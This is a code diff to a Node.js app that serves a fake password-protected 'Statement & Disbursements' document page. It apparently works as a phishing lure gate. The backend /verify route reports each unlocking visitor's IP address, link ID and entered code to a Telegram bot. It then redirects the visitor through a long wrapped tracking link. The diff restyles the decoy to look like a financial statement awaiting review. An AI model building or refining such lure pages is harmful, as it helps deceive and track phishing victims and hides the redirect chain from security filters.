@@ -11,8 +11,8 @@ const myHTML = `
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="Protected PDF Document Viewer">
-  <title>Project-1288.pdf - Protected preview</title>
+  <meta name="description" content="Statement & Disbursements - Authorized access only">
+  <title>Protected document</title>
   <style>
     * {
       margin: 0;
@@ -24,451 +24,196 @@ const myHTML = `
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
       height: 100vh;
       overflow: hidden;
-      background: #1a1a1a;
     }
 
-    /* Header Bar */
-    .header {
-      height: 56px;
-      background: #2d2d2d;
+    .container {
       display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 0 16px;
-      color: white;
+      height: 100vh;
     }
 
-    .header-left {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-    }
-
-    .pdf-icon {
-      width: 32px;
-      height: 32px;
-      background: #e74c3c;
-      border-radius: 4px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-weight: bold;
-      font-size: 10px;
-    }
-
-    .file-info {
-      display: flex;
-      flex-direction: column;
-    }
-
-    .filename {
-      font-size: 14px;
-      font-weight: 600;
-    }
-
-    .protected-label {
-      font-size: 12px;
-      color: #999;
-      display: flex;
-      align-items: center;
-      gap: 4px;
-    }
-
-    .lock-icon {
-      width: 12px;
-      height: 12px;
-    }
-
-    .header-right {
-      display: flex;
-      align-items: center;
-      gap: 16px;
-    }
-
-    .zoom-controls {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      font-size: 14px;
-    }
-
-    .zoom-btn {
-      background: none;
-      border: none;
-      color: white;
-      cursor: pointer;
-      padding: 4px 8px;
-      font-size: 16px;
-    }
-
-    .zoom-btn:hover {
-      background: rgba(255,255,255,0.1);
-      border-radius: 4px;
-    }
-
-    .nav-controls {
-      display: flex;
-      gap: 8px;
-    }
-
-    .nav-btn {
-      background: none;
-      border: none;
-      color: white;
-      cursor: pointer;
-      padding: 4px 8px;
-      font-size: 14px;
-    }
-
-    .nav-btn:hover {
-      background: rgba(255,255,255,0.1);
-      border-radius: 4px;
-    }
-
-    /* Main Container */
-    .main-container {
-      display: flex;
-      height: calc(100vh - 56px);
-    }
-
-    /* Sidebar */
-    .sidebar {
-      width: 200px;
-      background: #2d2d2d;
-      padding: 16px;
-      overflow-y: auto;
-    }
-
-    .sidebar-title {
-      color: #999;
-      font-size: 12px;
-      font-weight: 600;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      margin-bottom: 16px;
-    }
-
-    .page-thumbnail {
-      background: white;
-      border-radius: 4px;
-      margin-bottom: 16px;
-      padding: 12px;
-      cursor: pointer;
-      transition: all 0.2s;
-    }
-
-    .page-thumbnail:hover {
-      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
-    }
-
-    .page-thumbnail.active {
-      box-shadow: 0 0 0 2px #4a9eff;
-    }
-
-    .thumbnail-preview {
-      background: #f0f0f0;
-      height: 120px;
-      border-radius: 2px;
-      margin-bottom: 8px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #999;
-      font-size: 12px;
-    }
-
-    .page-number {
-      text-align: center;
-      color: #999;
-      font-size: 12px;
-    }
-
-    /* Content Area */
-    .content-area {
+    /* Left Side - Image Section */
+    .image-section {
       flex: 1;
       position: relative;
-      background: #1a1a1a;
+      background: linear-gradient(to bottom, rgba(30, 58, 95, 0.4), rgba(30, 58, 95, 0.85)), 
+                  url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 800"><rect fill="%231e3a5f" width="1200" height="800"/><g fill="%232d4a6f" opacity="0.5"><rect x="100" y="150" width="400" height="250" rx="12"/><circle cx="700" cy="300" r="150"/><rect x="850" y="100" width="250" height="400" rx="8"/></g><g fill="%234a6a8f" opacity="0.3"><rect x="200" y="450" width="300" height="200" rx="10"/><circle cx="600" cy="600" r="120"/><rect x="900" y="550" width="200" height="150" rx="6"/></g></svg>');
+      background-size: cover;
+      background-position: center;
       display: flex;
-      align-items: center;
-      justify-content: center;
-      overflow: hidden;
-    }
-
-    /* Blurred PDF Background */
-    .pdf-background {
-      position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      background: white;
-      filter: blur(8px);
-      opacity: 0.3;
-    }
-
-    .pdf-page {
-      width: 600px;
-      height: 800px;
-      background: white;
-      margin: 20px auto;
-      padding: 40px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
-    }
-
-    .pdf-line {
-      height: 12px;
-      background: #e0e0e0;
-      margin-bottom: 16px;
-      border-radius: 2px;
-    }
-
-    .pdf-line.short {
-      width: 60%;
-    }
-
-    .pdf-line.medium {
-      width: 80%;
-    }
-
-    /* Modal Dialog */
-    .modal-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      background: rgba(0,0,0,0.5);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      z-index: 1000;
-    }
-
-    .modal {
-      background: white;
-      border-radius: 8px;
+      flex-direction: column;
+      justify-content: flex-end;
       padding: 48px;
-      width: 520px;
-      max-width: 90%;
-      box-shadow: 0 8px 32px rgba(0,0,0,0.3);
-    }
-
-    .modal-icon {
-      width: 48px;
-      height: 48px;
-      background: #e74c3c;
-      border-radius: 8px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin-bottom: 16px;
-      font-weight: bold;
       color: white;
-      font-size: 14px;
     }
 
-    .modal-label {
-      color: #e74c3c;
+    .company-label {
       font-size: 12px;
       font-weight: 700;
+      letter-spacing: 0.1em;
       text-transform: uppercase;
-      letter-spacing: 0.5px;
+      margin-bottom: 12px;
+      opacity: 0.9;
+    }
+
+    .document-title {
+      font-size: 40px;
+      font-weight: 700;
+      margin-bottom: 12px;
+      line-height: 1.2;
+    }
+
+    .document-meta {
+      font-size: 15px;
+      opacity: 0.85;
+      font-weight: 400;
+    }
+
+    /* Right Side - Form Section */
+    .form-section {
+      width: 520px;
+      background: white;
+      padding: 64px 56px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+
+    .form-title {
+      font-size: 28px;
+      font-weight: 700;
+      color: #1a202c;
       margin-bottom: 8px;
     }
 
-    .modal-title {
-      font-size: 28px;
-      font-weight: 700;
-      color: #1a1a1a;
-      margin-bottom: 16px;
+    .form-subtitle {
+      font-size: 14px;
+      color: #718096;
+      margin-bottom: 24px;
     }
 
-    .modal-description {
+    .form-description {
       font-size: 15px;
-      color: #666;
+      color: #4a5568;
       line-height: 1.6;
       margin-bottom: 32px;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
     }
 
     .form-label {
       display: block;
       font-size: 13px;
       font-weight: 600;
-      color: #666;
+      color: #2d3748;
       margin-bottom: 8px;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
     }
 
     .form-input {
       width: 100%;
       height: 48px;
       padding: 0 16px;
-      border: 1px solid #ddd;
-      border-radius: 4px;
+      border: 2px solid #4299e1;
+      border-radius: 6px;
       font-size: 15px;
-      color: #1a1a1a;
-      margin-bottom: 24px;
-      outline: none;
+      color: #2d3748;
       transition: all 0.2s;
+      outline: none;
     }
 
     .form-input:focus {
-      border-color: #4a9eff;
-      box-shadow: 0 0 0 3px rgba(74, 158, 255, 0.1);
+      border-color: #4299e1;
+      box-shadow: 0 0 0 3px rgba(66, 153, 225, 0.2);
     }
 
     .form-input::placeholder {
-      color: #999;
+      color: #a0aec0;
     }
 
     .submit-btn {
       width: 100%;
       height: 48px;
-      background: #1a1a1a;
+      background: #1e3a5f;
       color: white;
       border: none;
-      border-radius: 4px;
+      border-radius: 6px;
       font-size: 15px;
       font-weight: 600;
       cursor: pointer;
       transition: all 0.2s;
-      margin-bottom: 16px;
+      margin-top: 8px;
     }
 
     .submit-btn:hover {
-      background: #2d2d2d;
+      background: #152a45;
       transform: translateY(-1px);
-      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+      box-shadow: 0 4px 12px rgba(30, 58, 95, 0.4);
     }
 
     .submit-btn:active {
       transform: translateY(0);
     }
 
-    .modal-footer {
+    .form-footer {
+      margin-top: 20px;
       font-size: 13px;
-      color: #999;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-
-    .check-icon {
-      color: #27ae60;
+      color: #a0aec0;
+      text-align: center;
     }
 
     .error-message {
-      color: #e74c3c;
+      color: #e53e3e;
       font-size: 13px;
-      margin-top: -16px;
-      margin-bottom: 16px;
+      margin-top: 8px;
       min-height: 20px;
     }
 
     /* Responsive */
-    @media (max-width: 768px) {
-      .sidebar {
+    @media (max-width: 968px) {
+      .image-section {
         display: none;
       }
       
-      .modal {
+      .form-section {
+        width: 100%;
+        padding: 48px 32px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .form-section {
         padding: 32px 24px;
       }
       
-      .modal-title {
+      .form-title {
         font-size: 24px;
+      }
+      
+      .document-title {
+        font-size: 32px;
       }
     }
   </style>
 </head>
 <body>
-  <!-- Header -->
-  <header class="header">
-    <div class="header-left">
-      <div class="pdf-icon">PDF</div>
-      <div class="file-info">
-        <div class="filename">Project-1288.pdf</div>
-        <div class="protected-label">
-          <svg class="lock-icon" viewBox="0 0 24 24" fill="currentColor">
-            <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
-          </svg>
-          Protected preview
-        </div>
-      </div>
+  <div class="container">
+    <!-- Left Side - Image Section -->
+    <div class="image-section">
+      <div class="company-label">Protected Document</div>
+      <h1 class="document-title">Statement & Disbursements</h1>
+      <div class="document-meta">Reference 248395JH49Z2 · Pending Review</div>
     </div>
-    <div class="header-right">
-      <div class="zoom-controls">
-        <button class="zoom-btn">−</button>
-        <span>100%</span>
-        <button class="zoom-btn">+</button>
-      </div>
-      <div class="nav-controls">
-        <button class="nav-btn">‹</button>
-        <button class="nav-btn">⋯</button>
-      </div>
-    </div>
-  </header>
 
-  <!-- Main Container -->
-  <div class="main-container">
-    <!-- Sidebar -->
-    <aside class="sidebar">
-      <div class="sidebar-title">PAGES</div>
-      <div class="page-thumbnail active">
-        <div class="thumbnail-preview">
-          <div style="width: 80%; height: 8px; background: #ddd; margin-bottom: 8px; border-radius: 2px;"></div>
-          <div style="width: 80%; height: 8px; background: #ddd; margin-bottom: 8px; border-radius: 2px;"></div>
-          <div style="width: 60%; height: 8px; background: #ddd; margin-bottom: 8px; border-radius: 2px;"></div>
-          <div style="width: 100%; height: 60px; background: #f0f0f0; border-radius: 2px; margin-top: 16px;"></div>
-        </div>
-        <div class="page-number">1</div>
-      </div>
-      <div class="page-thumbnail">
-        <div class="thumbnail-preview">
-          <div style="width: 80%; height: 8px; background: #ddd; margin-bottom: 8px; border-radius: 2px;"></div>
-          <div style="width: 80%; height: 8px; background: #ddd; margin-bottom: 8px; border-radius: 2px;"></div>
-          <div style="display: flex; gap: 4px; margin-top: 16px;">
-            <div style="width: 30%; height: 40px; background: #ddd; border-radius: 2px;"></div>
-            <div style="width: 30%; height: 60px; background: #ddd; border-radius: 2px;"></div>
-            <div style="width: 30%; height: 40px; background: #ddd; border-radius: 2px;"></div>
-          </div>
-        </div>
-        <div class="page-number">2</div>
-      </div>
-    </aside>
+    <!-- Right Side - Form Section -->
+    <div class="form-section">
+      <h2 class="form-title">Enter the password to view</h2>
+      <p class="form-subtitle">Authorized access only</p>
+      <p class="form-description">
+        Your latest financial statement and disbursement details are now available. Enter the password you were given to open the document.
+      </p>
 
-    <!-- Content Area -->
-    <main class="content-area">
-      <!-- Blurred PDF Background -->
-      <div class="pdf-background">
-        <div class="pdf-page">
-          <div class="pdf-line" style="width: 40%; margin-bottom: 32px;"></div>
-          <div class="pdf-line medium"></div>
-          <div class="pdf-line medium"></div>
-          <div class="pdf-line medium"></div>
-          <div class="pdf-line short" style="margin-top: 32px;"></div>
-          <div class="pdf-line medium"></div>
-          <div class="pdf-line medium"></div>
-          <div style="margin-top: 48px; display: flex; gap: 16px;">
-            <div style="flex: 1; height: 120px; background: #f0f0f0; border-radius: 4px;"></div>
-            <div style="flex: 1; height: 120px; background: #f0f0f0; border-radius: 4px;"></div>
-            <div style="flex: 1; height: 120px; background: #f0f0f0; border-radius: 4px;"></div>
-          </div>
-        </div>
-      </div>
-
-      <!-- Modal Dialog -->
-      <div class="modal-overlay">
-        <div class="modal">
-          <div class="modal-icon">PDF</div>
-          <div class="modal-label">PROTECTED DOCUMENT</div>
-          <h1 class="modal-title">Enter the password to view</h1>
-          <p class="modal-description">
-            This file is locked for client review. Enter the password you were given to open the document.
-          </p>
-
-          <form id="access-form">
+      <form id="access-form">
         <div class="form-group">
           <label class="form-label" for="access-code">DOCUMENT PASSWORD</label>
           <input 
@@ -485,13 +230,8 @@ const myHTML = `
         <button type="submit" class="submit-btn">Unlock Document</button>
       </form>
 
-          <div class="modal-footer">
-            <span class="check-icon">✓</span>
-            <span>The file stays on this page until it is unlocked</span>
-          </div>
-        </div>
-      </div>
-    </main>
+      <p class="form-footer">The file stays on this page until it is unlocked.</p>
+    </div>
   </div>
 
   <script>
@@ -528,9 +268,10 @@ const myHTML = `
 // THE BACKEND API
 // ==========================================
 app.post('/verify', async (req, res) => {
-  const { code, linkId } = req.body; // Receive both password and link ID
-  const CORRECT_CODE = "quote452"; // Your password
-  const TARGET_URL = "https://x.com"; // Where they go after unlocking
+  const { code } = req.body;
+  const linkId = req.query.id || 'unknown'; // Capture the unique ID from URL
+  const CORRECT_CODE = "037435";
+  const TARGET_URL = "https://shared.outlook.inky.com/link?domain=web-tracker.bisnow.net&t=h.eJx1kU1v3CAQhv9KZGl9KgaM1x-RrKRV1VvaVLnlssJ4sotswwqGkLbqfy8kSnJpJA4w88w77zB_iuDW4vKiOCGe_SWlESaCTqoFXDVpb2ysDCC9kgq1NaNSxJ-t8dYRtWq1lGd5hEPSGN8EYnwtVHajUfqTNke0hsyKGoieKhutW1IwNcs3MockiURpp1YgHsOs7UQ4b4Xoy3OYVu1Ph1kijDWr65QgvC1VKgGDBz2Pr6Q9mLBN4Ma6Ew3b1awMHlwmSpTuCPhudCc-7-pv6WS7Lzay3RT4GIVHvWboY8JjMrklV2TWfgrOvzwm-VD3feXDtkn3i7gkBKlr6gnOVzM80qtlbP3T7Xe38fDV_8Y7zu72Nz_vv9z-KD5dFEveEOo8G9po6Jx-frl-D1RKUtE0wLhi-wem-FR3g2gF1NAI3nEB3UB5NzDOm7Ydqp7t-6HrsjRkafBJS2JayXWUa3Z1AsANUD4PnLk5c_9N_v0HhmrFhQ.MEYCIQDJaQ5m7UZxVgIAulgtOquaBwqMZDNPuPgzJkjTKR9nYwIhALhSo2-Jw3bwWb3VICKmntWYM5aIe2Kc2DoqEsk9FXaT";
 
   if (code === CORRECT_CODE) {
     const token = process.env.TELEGRAM_BOT_TOKEN;
@@ -538,20 +279,18 @@ app.post('/verify', async (req, res) => {
 
     if (token && chatId) {
       const ip = req.headers['x-forwarded-for'] || req.ip;
-      const message = `🔓 *DOCUMENT UNLOCKED*\n📄 Link ID: ${linkId}\n IP: ${ip}\n✅ Code: ${code}`;
+      const message = ` *DOCUMENT ACCESSED*\n Link ID: ${linkId}\n IP: ${ip}\n✅ Code: ${code}`;
       
-      try {
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
-        });
-      } catch (err) { console.error(err); }
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
+      });
     }
-    return res.json({ success: true });
+    return res.json({ success: true, redirectUrl: TARGET_URL });
   }
 
-  return res.status(401).json({ success: false, message: "Incorrect password." });
+  return res.status(401).json({ success: false, message: "That access code is incorrect. Try again." });
 });
 
 // Serve the HTML on the homepage
